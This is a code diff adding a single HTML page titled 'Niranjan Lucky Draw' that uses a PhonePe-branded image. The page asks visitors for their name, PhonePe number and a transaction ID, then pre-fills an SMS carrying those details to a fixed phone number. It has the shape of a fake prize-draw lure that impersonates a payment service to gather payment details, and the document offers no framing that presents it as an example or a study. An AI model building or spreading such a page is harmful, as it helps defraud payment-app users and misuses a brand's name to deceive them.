@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Niranjan Lucky Draw</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    img {
+      max-width: 300px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px white;
+      margin-bottom: 20px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    button {
+      background-color: orange;
+      color: black;
+      border: none;
+      padding: 12px 24px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: transform 0.1s;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    input {
+      padding: 10px;
+      margin: 8px;
+      border-radius: 6px;
+      border: none;
+      width: 260px;
+      font-size: 16px;
+    }
+
+    .form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .image-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Page 1: Image and Next button -->
+  <div id="page1">
+    <div class="image-section">
+      <img src="https://raw.githubusercontent.com/Niranjan164/LUCKY-DRAW/main/Phone%20pay.png" alt="PhonePe Image">
+      <button id="nextBtn">Next</button>
+    </div>
+  </div>
+
+  <!-- Page 2: Form -->
+  <div id="page2" class="hidden">
+    <div class="form">
+      <input type="text" id="username" placeholder="Enter your name">
+      <input type="text" id="phonepay" placeholder="PhonePe number">
+      <input type="text" id="ref" placeholder="Transaction ID">
+      <button id="sendBtn">Send SMS</button>
+    </div>
+  </div>
+
+  <!-- Custom Click Sound -->
+  <audio id="clickSound" src="https://github.com/Niranjan164/COMPILER/raw/main/click-151673_073339.mp3"></audio>
+
+  <script>
+    const clickSound = document.getElementById('clickSound');
+    const nextBtn = document.getElementById('nextBtn');
+    const sendBtn = document.getElementById('sendBtn');
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+
+    nextBtn.addEventListener('click', () => {
+      clickSound.currentTime = 0;
+      clickSound.play();
+      page1.classList.add('hidden');
+      page2.classList.remove('hidden');
+    });
+
+    sendBtn.addEventListener('click', () => {
+      clickSound.currentTime = 0;
+      clickSound.play();
+
+      const name = document.getElementById('username').value;
+      const phone = document.getElementById('phonepay').value;
+      const ref = document.getElementById('ref').value;
+
+      const message = `USER NAME: ${name}%0APHONE PAY NUMBER: ${phone}%0APHONE PAY REFERENCE URL: ${ref}`;
+      const smsUrl = `sms:9515888385?body=${message}`;
+      window.location.href = smsUrl;
+    });
+
+    document.querySelectorAll('input').forEach(input => {
+      input.addEventListener('keydown', () => {
+        clickSound.currentTime = 0;
+        clickSound.play();
+      });
+    });
+  </script>
+</body>
+</html>
